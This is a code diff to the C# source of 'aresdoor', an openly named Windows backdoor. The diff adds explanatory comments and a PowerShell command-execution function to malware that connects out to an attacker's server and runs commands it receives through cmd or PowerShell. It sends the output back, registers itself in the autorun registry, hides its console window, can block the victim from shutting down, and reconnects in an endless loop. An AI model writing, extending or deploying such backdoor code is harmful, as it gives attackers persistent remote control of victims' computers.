@@ -5,6 +5,7 @@ namespace aresdoor
 {
     class Networking
     {
+        /* Check connection to a defined server */
         public static bool checkInternetConn(string server)
         {
             try
@@ -18,6 +19,7 @@ namespace aresdoor
             catch (Exception) { return false; }
         }
 
+        /* Resolve hostname to the first IP address that shows in the array */
         public static string resolveHostName(string hostname)
         {
             IPAddress[] addressList = Dns.GetHostAddresses(hostname);
@@ -27,7 +29,8 @@ namespace aresdoor
 
     class Misc
     {
-        public static string exec(string cmd)
+        /* Execute commands via command prompt */
+        public static string execCommandPrompt(string cmd)
         {
             System.Diagnostics.Process p = new System.Diagnostics.Process();
             p.StartInfo.UseShellExecute = false;
@@ -43,9 +46,28 @@ namespace aresdoor
             return output; // return output of command
         }
 
+        /* Execute commands via powershell */
+        public static string execPowershellCommand(string cmd)
+        {
+            System.Diagnostics.Process p = new System.Diagnostics.Process();
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.FileName = "powershell.exe";
+            p.StartInfo.Arguments = "/C " + cmd;
+            p.Start();
+
+            // To avoid deadlocks, always read the output stream first and then wait.
+            string output = p.StandardOutput.ReadToEnd();
+            p.WaitForExit();
+
+            return output; // return output of command
+        }
+
+        /* Convert string to a byte array */
         public static byte[] byteCode(string contents)
         { return System.Text.Encoding.ASCII.GetBytes(contents); }
 
+        /* Append current executing assembly to the autorun registration in Windows. */
         public static void SetStartup()
         {
             Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey
@@ -67,7 +89,6 @@ namespace aresdoor
         private static bool prevent_shutdown = false;
         private static bool debugMode = true;
         
-
         private static void sendBackdoor(string server, int port)
         {
             try
@@ -96,7 +117,7 @@ namespace aresdoor
                         output = Misc.byteCode("Application added to startup registry.\n");
                     }
                     else
-                        try { output = Misc.byteCode(Misc.exec(responseData)); } catch (Exception) { output = Misc.byteCode("Command couldn't execute."); }
+                        try { output = Misc.byteCode(Misc.execCommandPrompt(responseData)); } catch (Exception) { output = Misc.byteCode("Command couldn't execute."); }
 
                     try
                     { stream.Write(output, 0, output.Length); } // Send output of command back to attacker.
@@ -126,19 +147,24 @@ namespace aresdoor
              *      ./aresdoor.exe (no args) << requires hardcoded configuration
              * 
              */
+
+            /* Hide console if debug mode is disabled. */
             var handle = GetConsoleWindow();
             if (!debugMode)
                 ShowWindow(handle, SW_HIDE); // hide window
 
+            /* Intercept command line arguments if any are found. */
             try
             {
                 if (args.Length >= 2)
                 { server = args[0]; port = Int32.Parse(args[1]); }
             } catch (Exception exc) { Console.WriteLine(exc.Message); }
 
+            /* Undertermined code. Not sure if it's required or not? */
             if (System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ToString()).Length != 0)
             { System.Environment.Exit(0); }
 
+            /* Prevent the client (victim) from shutting down the computer */
             if (prevent_shutdown == true)
             {
                 new System.Threading.Thread(() =>
@@ -157,6 +183,7 @@ namespace aresdoor
                 }).Start();
             }
 
+            /* Persistant backdoor connection */
             while (true)
             {
                 if (Networking.checkInternetConn(server)) // Determine if the victim is able to connect to the attacker via DHCP (ping) request 
